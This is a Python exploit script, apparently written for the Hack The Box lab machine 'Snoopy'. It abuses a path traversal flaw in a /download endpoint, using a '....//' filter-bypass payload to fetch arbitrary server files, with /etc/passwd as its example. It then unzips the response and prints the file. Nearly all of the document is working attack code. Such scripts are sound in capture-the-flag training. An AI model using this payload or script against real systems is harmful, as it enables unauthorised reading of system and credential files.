#!/usr/bin/env python3

'''
HTB Snoopy (LFI)
----------------
Author: Marss
Repository: https://github.com/E1P0TR0
Date: 16 Set, 2023
'''

from argparse import ArgumentParser, RawDescriptionHelpFormatter
from os import remove
from requests import get
from requests.exceptions import ConnectTimeout, ConnectionError
from shutil import rmtree
from signal import signal, SIGINT
from sys import argv
from zipfile import ZipFile, BadZipFile

# Ctrl + c
signal(SIGINT, lambda signum, frame: exit('\n[!] User aborted.'))

# Main class
class Exploit:

    def __init__(self, args):

        self.args = args
        self.target = {
            'base_url':'http://snoopy.htb'
        }

    def run(self):

        if self.target_response():
            
            self.read_file()
    
    def target_response(self) -> bool:

        try:
            response = get(self.target['base_url'], timeout=5)

            if response.ok:
                print(f'\n[+] Target up: {response.url}')
            
            return response.ok

        except ConnectTimeout:
            exit('\n[!] Verify VPN connection.')

        except ConnectionError:
            print(f'\n[x] Cannor resolve: {self.target["base_url"]}')
            exit('[!] Check the machine connection or resolve the specific domain on your local DNS server (/etc/hosts).')

    def read_file(self):

        try:
            response = get(self.target['base_url'] + '/download',
                params=f'file=....//....//....//....//{self.args.file}')

            zip_file = 'tmp.zip'
            with open(zip_file, 'wb') as file:
                file.write(response.content)

            with ZipFile(zip_file, 'r') as file:
                file_path = file.namelist()[0]
                file.extract(file_path)

                with open(file_path, 'r') as file:
                    print(f'\n{file.read()}')

            rmtree('press_package')

        except BadZipFile:
            exit('\n[!] Invalid file.')

        except Exception as error:
            exit('\n[x] Error: ' + repr(error))
        
        finally:
            remove('tmp.zip')

# Main flow
if __name__ == '__main__':

    title = '| HTB Snoopy (LFI) |'

    parser = ArgumentParser(
        formatter_class=RawDescriptionHelpFormatter,
        epilog=f'''Example:
        python3 {argv[0]} -f /etc/passwd
        ''')

    parser.add_argument('-f', '--file', required=True, type=str, help='File to read')

    args = parser.parse_args()

    print(title)

    exploit = Exploit(args)
    exploit.run()